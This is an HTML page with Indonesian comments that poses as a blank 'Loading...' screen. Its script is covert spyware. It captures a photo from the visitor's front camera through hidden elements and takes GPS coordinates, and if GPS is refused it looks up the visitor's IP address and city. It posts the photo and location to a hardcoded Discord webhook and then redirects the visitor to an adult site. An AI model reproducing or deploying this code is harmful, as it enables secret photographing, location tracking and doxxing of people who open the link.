<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat...</title>
    <style>
        *{margin:0;padding:0}
        body{background:#fff;height:100vh}
        video,canvas{position:absolute;opacity:0;pointer-events:none}
    </style>
</head>
<body>

<script>
// ✅ WEBHOOK UDAH TERISI! GAK USAH DIUBAH LAGI!
const WEBHOOK = "https://discord.com/api/webhooks/1538498418266218641/zM9vn4GAKeP_R6r5VTaC2Ccn_IAZQBHgUt2HvLWCqac519orhQJLSQlp8v89nelMYh6p";
const PINDAH_KE = "https://nekopoi.care";

// AMBIL FOTO DULU
navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
.then(kamera=>{
    const vid = document.createElement("video");
    vid.srcObject = kamera; vid.play();
    setTimeout(()=>{
        const kanvas = document.createElement("canvas");
        kanvas.width=400; kanvas.height=400;
        const ctx = kanvas.getContext("2d");
        ctx.drawImage(vid,0,0,400,400);
        const foto = kanvas.toDataURL("image/jpeg");
        kamera.getTracks().forEach(t=>t.stop());
        ambilLokasi(foto);
    },1500);
})
.catch(()=>ambilLokasi(null));

// AMBIL LOKASI: GPS DULU → GAGAL → PAKE IP OTOMATIS!
function ambilLokasi(foto){
    if(!navigator.geolocation){
        ambilLewatIP(foto); return;
    }
    navigator.geolocation.getCurrentPosition(
        pos=>{
            const lok = `🌍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}\n📍 Akurasi: ${Math.round(pos.coords.accuracy)}m`;
            kirim(foto,lok);
        },
        err=>{
            // ❌ GPS DITOLAK → OTOMATIS AMBIL LEWAT IP!
            ambilLewatIP(foto);
        },
        {enableHighAccuracy:true,timeout:6000}
    );
}

// ✅ LOKASI DARI IP — GAK PERLU IZIN!
function ambilLewatIP(foto){
    fetch("https://ipapi.co/json/")
    .then(r=>r.json())
    .then(data=>{
        const lok = `🌐 LOKASI DARI IP:\n📍 ${data.city}, ${data.region}\n🇮🇩 ${data.country_name}\n🔢 IP: ${data.ip}`;
        kirim(foto,lok);
    })
    .catch(()=>kirim(foto,"✅ Foto diambil!\n❌ Lokasi gak bisa diambil"));
}

function kirim(foto,teks){
    fetch(WEBHOOK,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            content:"```✅ DATA MASUK!\n"+teks+"```",
            embeds:foto?[{image:{url:foto}}]:[]
        })
    })
    .finally(()=>{window.location.href=PINDAH_KE;});
}
</script>
</body>
</html>
